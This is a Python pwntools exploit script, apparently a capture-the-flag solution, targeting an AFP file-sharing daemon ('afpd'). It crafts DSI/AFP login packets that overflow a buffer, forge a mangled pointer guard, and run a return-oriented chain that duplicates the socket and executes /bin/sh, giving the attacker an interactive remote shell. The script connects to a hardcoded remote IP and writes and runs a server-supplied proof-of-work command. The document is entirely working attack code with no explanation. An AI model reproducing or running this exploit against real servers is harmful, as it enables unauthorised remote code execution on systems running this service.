#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "18.181.73.12"
PORT = 4869
PROCESS = "./afpd"

DSIFUNC_CLOSE = 1
DSIFUNC_CMD = 2
DSIFUNC_STAT = 3
DSIFUNC_OPEN = 4
DSIFUNC_TICKLE = 5
DSIFUNC_WRITE = 6
DSIFUNC_ATTN = 8
DSIFUNC_MAX = 8

DSIOPT_ATTNQUANT = 1

AFP_LOGIN = 0x12
AFP_LOGINCONT = 0x13
AFP_LOGOUT = 0x14
AFP_LOGINEXT = 0x3f

def dsi_block(flags, command, requestID, doff, dsilen, reserved):
	block = p8(flags)
	block += p8(command)
	block += p16(requestID)
	block += p32(doff, endian="big")
	block += p32(dsilen, endian="big")
	block += p32(reserved)

	return block

def create_command(cmd, quantum):
	cmd = p8(cmd)
	cmd += p8(4)
	cmd += p32(quantum)

	return cmd

def create_payload(block_cmd, request_id, doff, dsilen, reserved, payload, flags=0):
	package = dsi_block(flags, block_cmd, request_id, doff, dsilen, reserved)
	package += payload

	return package


def exploit(r):
	if not LOCAL:
		r.recvline()
		CMD = r.recvline()
		with open("pow.sh", "w") as f:
			f.write("#!/bin/sh\n")
			f.write(CMD)
		os.system("chmod +x pow.sh")
		poc = process("./pow.sh")
		poc.recvuntil("token: ")
		resp = poc.recvline()[:-1]
		r.sendline(resp)
		
	# create session
	cmd = create_command(DSIOPT_ATTNQUANT, 0xdeadbeef)
	payload = create_payload(DSIFUNC_OPEN, 0x100, 0, len(cmd), 0, cmd)
	r.send(payload)
	HEADER = r.recv(0x1c)
	
	# call passwd_login
	log.info("Call initial clean login to prepare data on bss")

	version = "AFP2.2"
	uams = "DHX"

	rol = lambda val, r_bits, max_bits: \
    	(val << r_bits%max_bits) & (2**max_bits-1) | \
    	((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
 
	ror = lambda val, r_bits, max_bits: \
    	((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    	(val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

	POPRDXRBX = 0x4298c7
	POPRDI = 0x00000000004096ab
	POPRSI = 0x000000000040c2fc
	SYSCALL = 0x000000000042245d
	
	RSPMANGLER = 0xb480000000000032 ^ 0x6567c0

	JMP = rol(POPRDI ^ RSPMANGLER, 0x11, 64) 
	
	POPRAXCHANGEEDI = 0x000000000040fe72
	ADDRSP20POPRBX = 0x000000000042926c
	RET = 0x000000000041ca79
	
	SOCKET = 6

	POP3 = 0x0000000000409c76

	READPLT = 0x4082b0
	WRITEPLT = 0x407dc0
	DUP2PLT = 0x407f70
	XCHGEAXEDI = 0x000000000040fe75

	user = "metatalk"+ p64(0x0)
	user += p64(0x6567e0) + p64(0x6567e0)
	user += p64(SOCKET)
	user += p64(DUP2PLT)
	user += p64(0x00000000004280fa)
	user += "/bin/sh\x00"
	user += p64(0xdeadbeef)
	user += p64(0xdeadbeef)
	user += p64(0xdeadbeef) + p64(JMP)
	user += p64(0xdeadbeef) + p64(0x63c640)			# scanf locale
	user += p64(0x0000000000000100) + p64(0)  		# tcache sizes
	user += p64(POPRSI) 
	user += p64(0)
	user += p64(DUP2PLT)
	user += p64(POPRDI)
	user += p64(59) + p64(0x000000000040fe72)
	user += p64(0x6567d8+0x15) + p64(POPRDXRBX)    	# 0x20 / 0x30
	user += p64(0) + p64(0x63cfd8)  				# 0x40 / 0x50 (used in scanf)
	user += p64(POPRDI) + p64(0x6567d8)				# 0x60 / 0x70
	user += p64(SYSCALL) + p64(0x656900)
	user += p64(0x6567e0) + p64(0x6567e0)[:7]

	print len(user)
	pw = "C"*0x20

	command = p8(AFP_LOGIN)
	command += p8(len(version)) + version
	command += p8(len(uams)) + uams
	command += p8(len(user))+user
	command += p8(len(pw))+pw
	
	payload = create_payload(DSIFUNC_CMD, 0x100, 0x0, len(command), 0,command)
	
	r.send(payload)
	r.recv(1000)

	log.info("Create overflowing package (now having good ptrs on bss")	
	
	WRITEGOT = 0x00000000063c7a0

	user2 = "metatalk"+ p64(0x0) 

	user2 = user2 + "C"*(len(user)-len(user2))
	user = user2

	stage2 = p64(POPRDI)
	stage2 += p64(SOCKET)
	stage2 += p64(POPRSI)
	stage2 += p64(0)
	stage2 += p64(DUP2PLT)

	stage2 += p64(POPRDI)
	stage2 += p64(SOCKET)
	stage2 += p64(POPRSI)
	stage2 += p64(1)
	stage2 += p64(DUP2PLT)
	stage2 += p64(POPRDI)
	stage2 += p64(1)
	stage2 += p64(POPRSI)
	stage2 += p64(0x407f70)
	stage2 += p64(POPRDXRBX)
	stage2 += p64(0x100)
	stage2 += p64(0xcafebabe)
	stage2 += p64(WRITEPLT)

	stage2 += p64(POPRDXRBX)
	stage2 += p64(0x100)
	stage2 += p64(0xdeadbeef)
	stage2 += p64(WRITEPLT)
	stage2 += p64(0x000000000408E30)

	SLIDESIZE = 0xe0000

	command = p8(AFP_LOGIN)
	command += p8(len(version)) + version
	command += p8(len(uams)) + uams
	command += p8(len(user))+user
	command += p8(len(pw))+pw		
	command += "A"*3	
	command += p64(RET)*((SLIDESIZE)/8)
	command += stage2
	command += "C"*(363-3)		
	command += "F"*0x11000
	command += cyclic_metasploit(0x4ddd)
	command += "D"*0xb000	
	command += "C"*1000	
	command += cyclic_metasploit(3275)
	command += p64(0x656810)							# scanf locale
	command += cyclic_metasploit(3339 - 8 - 3275)
	command += p64(0x656810)
	command += cyclic_metasploit(64)
	command += p64(0x6567b0) 							# p64(0x656678)
	command += p64(0x656810)
	command += "A"*40
	command += p64(RSPMANGLER)							# guard
	command += "C"*(0x2000-8-40)
	payload = create_payload(DSIFUNC_CMD, 0x100, len(command), len(command), 0,command)

	r.send(payload)

	r.interactive()

	return


if __name__ == "__main__":
	
	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
	else:
		LOCAL = True
		r = remote("localhost", 5566)
		print(util.proc.pidof(r))
		pause()

	exploit(r)
